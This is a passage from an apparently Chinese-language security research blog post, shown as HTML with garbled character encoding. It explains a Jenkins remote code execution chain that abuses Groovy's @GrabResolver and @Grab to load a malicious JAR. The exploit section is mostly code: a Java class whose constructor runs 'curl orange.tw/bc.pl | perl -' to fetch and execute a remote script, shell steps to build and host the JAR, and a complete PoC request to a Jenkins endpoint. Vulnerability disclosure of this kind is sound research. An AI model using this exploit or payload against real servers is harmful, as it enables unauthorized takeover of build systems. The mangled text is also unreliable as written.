&lt;p&gt;æƒ³è§£æ±ºé€™å€‹å•é¡Œå¾ˆç°¡å–®ï¼Œåˆ° &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; ä¸­å°‡ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; ç§»é™¤å³å¯è§£æ±ºé€™å€‹å•é¡Œä¸¦åŸ·è¡Œä»»æ„ä»£ç¢¼!&lt;/p&gt;

&lt;p&gt;ä¸éé€™çµ•å°ä¸æ˜¯æœ€ä½³è§£! é€™å€‹æ’ä»¶æœƒéš¨è‘— Pipeline è¢«è‡ªå‹•å®‰è£ï¼Œç‚ºäº†è¦æˆåŠŸåˆ©ç”¨é€™å€‹æ¼æ´é‚„å¾—å…ˆè¦æ±‚ç®¡ç†å“¡æŠŠå®ƒç§»é™¤å¯¦åœ¨å¤ªè ¢äº†! å› æ­¤é€™æ¢è·¯åªèƒ½å…ˆæ‰“ä½ï¼Œç¹¼çºŒå°‹æ‰¾ä¸‹ä¸€å€‹æ–¹æ³•!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å†æ¬¡å˜—è©¦&quot;&gt;å†æ¬¡å˜—è©¦&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;ç¹¼çºŒé–±è®€ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming æ‰‹å†Š&lt;/a&gt;ï¼Œæˆ‘å€‘ç™¼ç¾äº†å¦ä¸€å€‹æœ‰è¶£çš„è¨»è§£ &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;ï¼Œé—œæ–¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; æ‰‹å†Šä¸­ä¸¦æ²’æœ‰è©³ç´°çš„æè¿°ï¼Œä½†ä½¿ç”¨ Google æˆ‘å€‘ç™¼ç¾äº†å¦ä¸€ç¯‡æ–‡ç«  - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;åŸä¾† Grape(&lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) æ˜¯ä¸€å€‹ Groovy å…§å»ºçš„å‹•æ…‹ JAR ç›¸ä¾æ€§ç®¡ç†ç¨‹å¼! å¯è®“é–‹ç™¼è€…å‹•æ…‹çš„å¼•å…¥ä¸åœ¨ classPath ä¸Šçš„å‡½å¼åº«! Grape çš„èªæ³•å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é…åˆ &lt;code class=&quot;highlighter-rouge&quot;&gt;@grab&lt;/code&gt; çš„è¨»è§£ï¼Œå¯è®“ Groovy åœ¨ç·¨è­¯æ™‚æœŸè‡ªå‹•å¼•å…¥ä¸å­˜åœ¨æ–¼ classPath ä¸­çš„ JAR æª”! ä½†å¦‚æœä½ çš„ç›®çš„åªæ˜¯è¦åœ¨ä¸€å€‹æœ‰åŸ·è¡Œ Pipeline æ¬Šé™çš„å¸³è™Ÿä¸Šç¹éåŸæœ‰ Pipeline çš„ Sandbox çš„è©±ï¼Œé€™å…¶å¯¦å°±è¶³å¤ äº†! ä¾‹å¦‚ä½ å¯ä»¥åƒè€ƒ &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; æ‰€æä¾›çš„ &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;ï¼Œåœ¨å·²çŸ¥ä½¿ç”¨è€…å¸³è™Ÿèˆ‡å¯†ç¢¼åŠæ¬Šé™è¶³å¤ çš„æƒ…æ³ä¸‹ï¼Œé”åˆ°é ç«¯ä»£ç¢¼åŸ·è¡Œçš„æ•ˆæœ!&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æ²’æœ‰å¸³è™Ÿå¯†ç¢¼åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; çš„æ–¹æ³•ä¸‹ï¼Œé€™åªæ˜¯ä¸€å€‹ç°¡å–®çš„èªæ³•æ¨¹è§£æå™¨ï¼Œä½ ç”šè‡³ç„¡æ³•æ§åˆ¶é ç«¯ä¼ºæœå™¨ä¸Šçš„æª”æ¡ˆï¼Œæ‰€ä»¥è©²æ€éº¼è¾¦å‘¢? æˆ‘å€‘ç¹¼çºŒç ”ç©¶ä¸‹å»ï¼Œä¸¦ç™¼ç¾äº†ä¸€å€‹å¾ˆæœ‰è¶£çš„è¨»è§£å«åš &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;ï¼Œç”¨æ³•å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çœ‹åˆ°é€™å€‹ï¼Œè°æ˜çš„ä½ æ‡‰è©²æœƒå¾ˆæƒ³æŠŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; æ”¹æˆæƒ¡æ„ç¶²å€å°å§! æˆ‘å€‘ä¾†è©¦è©¦æœƒæ€éº¼æ¨£å§!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
import org.restlet
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å–”å¹¹ï¼ŒçœŸçš„æœƒä¾†å­˜å–æ¬¸! åˆ°é€™è£¡æˆ‘å€‘å·²ç¶“ç¢ºä¿¡äº†é€é Grape å¯ä»¥è®“ Jenkins å¼•å…¥æƒ¡æ„çš„å‡½å¼åº«! ä½†ä¸‹ä¸€å€‹å•é¡Œæ˜¯ï¼Œè¦å¦‚ä½•åŸ·è¡Œä»£ç¢¼å‘¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åŸ·è¡Œä»»æ„ä»£ç¢¼&quot;&gt;å¦‚ä½•åŸ·è¡Œä»»æ„ä»£ç¢¼?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;åœ¨æ¼æ´çš„åˆ©ç”¨ä¸­ç¸½æ˜¯åœ¨ç ”ç©¶å¦‚ä½•å¾ç°¡å–®çš„ä»»æ„è®€ã€ä»»æ„å¯«åˆ°å–å¾—ç³»çµ±åŸ·è¡Œçš„æ¬Šé™! å¾å‰é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘å€‘å·²ç¶“å¯ä»¥é€é Grape å»å¯«å…¥æƒ¡æ„çš„ JAR æª”åˆ°é ç«¯ä¼ºæœå™¨ï¼Œä½†è¦æ€éº¼åŸ·è¡Œé€™å€‹ JAR æª”å‘¢? é€™åˆæ˜¯å¦ä¸€å€‹å•é¡Œ!&lt;/p&gt;

&lt;p&gt;è·Ÿé€² Groovy èªè¨€æ ¸å¿ƒæŸ¥çœ‹å°æ–¼ &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape çš„å¯¦ä½œ&lt;/a&gt;ï¼Œæˆ‘å€‘çŸ¥é“ç¶²è·¯å±¤çš„æŠ“å–æ˜¯é€é &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; é€™å€‹é¡åˆ¥ä¾†å®Œæˆ! æ‰€ä»¥é–‹å§‹å°‹æ‰¾å¯¦ä½œä¸­æ˜¯å¦æœ‰ä»»ä½•å¯ä»¥åŸ·è¡Œä»£ç¢¼çš„æ©Ÿæœƒ! å…¶ä¸­ï¼Œæˆ‘å€‘çœ‹åˆ°äº†ä¸€å€‹æœ‰è¶£çš„æ–¹æ³• - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç”±æ–¼ JAR æª”æ¡ˆå…¶å¯¦å°±æ˜¯ä¸€å€‹ ZIP å£“ç¸®æ ¼å¼çš„å­é›†ï¼ŒGrape æœƒæª¢æŸ¥æª”æ¡ˆä¸­æ˜¯å¦å­˜åœ¨ä¸€äº›æŒ‡å®šçš„å…¥å£é»ï¼Œå…¶ä¸­ä¸€å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; çš„å…¥å£é»æª¢æŸ¥å¼•èµ·äº†æˆ‘å€‘çš„èˆˆè¶£ï¼ŒæŒçºŒè·Ÿé€² &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(â€¦)&lt;/a&gt; çš„å¯¦ä½œæˆ‘å€‘ç™¼ç¾:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™è£¡çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; ä¸å°±ä»£è¡¨è‘—å¯ä»¥å‘¼å«åˆ°ä»»æ„é¡åˆ¥çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; å—? æ²’éŒ¯! æ‰€ä»¥åªéœ€ç”¢ç”Ÿä¸€å€‹æƒ¡æ„çš„ JAR æª”ï¼ŒæŠŠè¦åŸ·è¡Œçš„é¡åˆ¥å…¨åæ”¾è‡³ &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; ä¸­å³å¯å‘¼å«æŒ‡å®šé¡åˆ¥çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; å»åŸ·è¡Œä»»æ„ä»£ç¢¼! å®Œæ•´çš„æ¼æ´åˆ©ç”¨éç¨‹å¦‚ä¸‹:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å½±ç‰‡:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

